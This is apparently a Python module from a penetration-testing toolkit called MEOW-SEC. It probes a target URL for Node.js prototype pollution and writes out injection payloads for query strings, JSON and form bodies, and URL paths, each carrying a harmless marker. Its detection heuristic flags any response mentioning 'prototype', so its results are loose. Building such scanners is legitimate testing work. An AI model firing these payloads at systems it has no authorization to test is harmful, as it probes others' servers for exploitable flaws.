# -*- coding: utf-8 -*-
"""MEOW-SEC :: PROTO — Prototype Pollution Tester (Node.js)"""
import os, re, json
from datetime import datetime
from urllib.parse import urlparse, quote

from core.ui import (console, show_module_banner, ok, err, info, warn, find,
                     ask_choice, G1, G2, CY, OR, RD, DM)
from core.cats import cat_talk, CAT_SCAN
from rich.panel  import Panel
from rich.table  import Table
from rich.prompt import Prompt, Confirm
from rich.rule   import Rule
from rich        import box

try:
    import requests as _req
    _req.packages.urllib3.disable_warnings()
    HAS_REQUESTS = True
except Exception:
    HAS_REQUESTS = False


def _save(name, target, results):
    os.makedirs("data", exist_ok=True)
    fname = f"data/{name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(fname, "w", encoding="utf-8") as f:
        json.dump({"target": target, "results": results,
                   "timestamp": datetime.now().isoformat()}, f, indent=2)
    ok(f"Results saved: [bold]{fname}[/]")


_MARKER = "meow_polluted_7749"

_QUERY_PAYLOADS = [
    ("Proto via __proto__",       f"?__proto__[testprop]={_MARKER}"),
    ("Proto via constructor",     f"?constructor[prototype][testprop]={_MARKER}"),
    ("Proto nested",              f"?a[__proto__][testprop]={_MARKER}"),
    ("Proto deep",                f"?a[b][__proto__][testprop]={_MARKER}"),
]

_JSON_PAYLOADS = [
    ("JSON __proto__",            {"__proto__": {"testprop": _MARKER}}),
    ("JSON constructor proto",    {"constructor": {"prototype": {"testprop": _MARKER}}}),
    ("JSON nested",               {"a": {"b": {"__proto__": {"polluted": _MARKER}}}}),
    ("JSON deep nested",          {"a": {"b": {"c": {"__proto__": {"testprop": _MARKER}}}}}),
]

_FORM_PAYLOADS = [
    ("Form __proto__",            f"__proto__[testprop]={_MARKER}"),
    ("Form constructor proto",    f"constructor[prototype][testprop]={_MARKER}"),
]


def _clean_req(url, timeout=8):
    """Baseline request to check if marker appears without injection."""
    try:
        r = _req.get(url, verify=False, allow_redirects=False, timeout=timeout,
                     headers={"User-Agent": "MEOW-PROTO/1.1"})
        return r.status_code, r.text, dict(r.headers)
    except Exception:
        return 0, "", {}


def _inject_query(url, query_suffix, timeout=8):
    test_url = url.rstrip("?") + query_suffix
    try:
        r = _req.get(test_url, verify=False, allow_redirects=False, timeout=timeout,
                     headers={"User-Agent": "MEOW-PROTO/1.1"})
        return r.status_code, r.text, dict(r.headers)
    except Exception as e:
        return 0, str(e), {}


def _inject_json(url, payload_dict, timeout=8):
    try:
        r = _req.post(url, json=payload_dict,
                      verify=False, allow_redirects=False, timeout=timeout,
                      headers={"User-Agent": "MEOW-PROTO/1.1",
                               "Content-Type": "application/json"})
        return r.status_code, r.text, dict(r.headers)
    except Exception as e:
        return 0, str(e), {}


def _inject_form(url, form_data_str, timeout=8):
    try:
        r = _req.post(url, data=form_data_str,
                      verify=False, allow_redirects=False, timeout=timeout,
                      headers={"User-Agent": "MEOW-PROTO/1.1",
                               "Content-Type": "application/x-www-form-urlencoded"})
        return r.status_code, r.text, dict(r.headers)
    except Exception as e:
        return 0, str(e), {}


def _inject_path(url, timeout=8):
    test_url = url.rstrip("/") + f"/__proto__/testprop/{_MARKER}"
    try:
        r = _req.get(test_url, verify=False, allow_redirects=False, timeout=timeout,
                     headers={"User-Agent": "MEOW-PROTO/1.1"})
        return r.status_code, r.text, dict(r.headers)
    except Exception as e:
        return 0, str(e), {}


def _check_pollution(body, headers, clean_body, clean_headers):
    """Check if marker appears in response or headers changed."""
    if _MARKER in body:
        return True, "marker in response body"
    for k, v in headers.items():
        if _MARKER in v:
            return True, f"marker in response header {k}"
    # Check for prototype-related error messages
    for pat in [r"prototype", r"__proto__", r"Cannot read propert", r"polluted"]:
        if re.search(pat, body, re.IGNORECASE):
            snippet = re.search(pat, body, re.IGNORECASE).group(0)[:40]
            return True, f"prototype error: {snippet}"
    return False, ""


def run():
    show_module_banner("proto")
    cat_talk(CAT_SCAN, "Prototype pollution tester for Node.js apps", OR)
    console.print()
    warn("AUTHORIZED USE ONLY — Unauthorized testing is illegal.")
    if not Confirm.ask(f"  [{OR}]◈ I confirm this is an authorized target[/]", default=False):
        info("Aborted."); return

    if not HAS_REQUESTS:
        err("requests library not available. Install it: pip install requests"); return

    url = Prompt.ask(f"  [{G1}]◈ Target URL[/]").strip()
    if not url.startswith("http"):
        url = "https://" + url

    info("Fetching baseline...")
    base_status, base_body, base_hdrs = _clean_req(url)
    info(f"Baseline: status={base_status}  body={len(base_body)}B")
    console.print()

    results = []

    # Query string injections
    info("Testing prototype pollution via query parameters...")
    for pname, qs in _QUERY_PAYLOADS:
        status, body, hdrs = _inject_query(url, qs)
        vuln, reason = _check_pollution(body, hdrs, base_body, base_hdrs)
        results.append({"method": "GET query", "payload": pname,
                        "status": status, "severity": "POTENTIAL" if vuln else "SAFE",
                        "note": reason or "no indicator"})
        if vuln:
            find(f"[GET] [{RD}]{pname}[/] — {reason}")

    # JSON body injections
    info("Testing via JSON POST body...")
    for pname, payload_dict in _JSON_PAYLOADS:
        status, body, hdrs = _inject_json(url, payload_dict)
        vuln, reason = _check_pollution(body, hdrs, base_body, base_hdrs)
        results.append({"method": "POST JSON", "payload": pname,
                        "status": status, "severity": "POTENTIAL" if vuln else "SAFE",
                        "note": reason or "no indicator"})
        if vuln:
            find(f"[JSON] [{RD}]{pname}[/] — {reason}")

    # Form body injections
    info("Testing via form POST body...")
    for pname, form_data in _FORM_PAYLOADS:
        status, body, hdrs = _inject_form(url, form_data)
        vuln, reason = _check_pollution(body, hdrs, base_body, base_hdrs)
        results.append({"method": "POST form", "payload": pname,
                        "status": status, "severity": "POTENTIAL" if vuln else "SAFE",
                        "note": reason or "no indicator"})
        if vuln:
            find(f"[form] [{RD}]{pname}[/] — {reason}")

    # Path injection
    info("Testing via URL path injection...")
    status, body, hdrs = _inject_path(url)
    vuln, reason = _check_pollution(body, hdrs, base_body, base_hdrs)
    results.append({"method": "URL path", "payload": f"/__proto__/testprop/{_MARKER}",
                    "status": status, "severity": "POTENTIAL" if vuln else "SAFE",
                    "note": reason or "no indicator"})
    if vuln:
        find(f"[path] [{RD}]URL path injection[/] — {reason}")

    # Display
    console.print()
    t = Table(title=f"[{G1}]Prototype Pollution Results[/]", box=box.MINIMAL_DOUBLE_HEAD,
              border_style=G2, header_style=CY)
    t.add_column("Method",   min_width=12)
    t.add_column("Payload",  min_width=28)
    t.add_column("Status",   min_width=7)
    t.add_column("Severity", min_width=10)
    t.add_column("Note",     min_width=28)

    sc_map = {"POTENTIAL": RD, "SAFE": G2}
    for r in results:
        sc = sc_map.get(r["severity"], DM)
        t.add_row(r["method"], r["payload"], str(r["status"]),
                  f"[{sc}]{r['severity']}[/]", r["note"])
    console.print(t)

    potentials = [r for r in results if r["severity"] == "POTENTIAL"]
    if potentials:
        find(f"{len(potentials)} prototype pollution indicator(s) found!")
    else:
        ok("No prototype pollution indicators detected.")

    _save("proto", url, results)
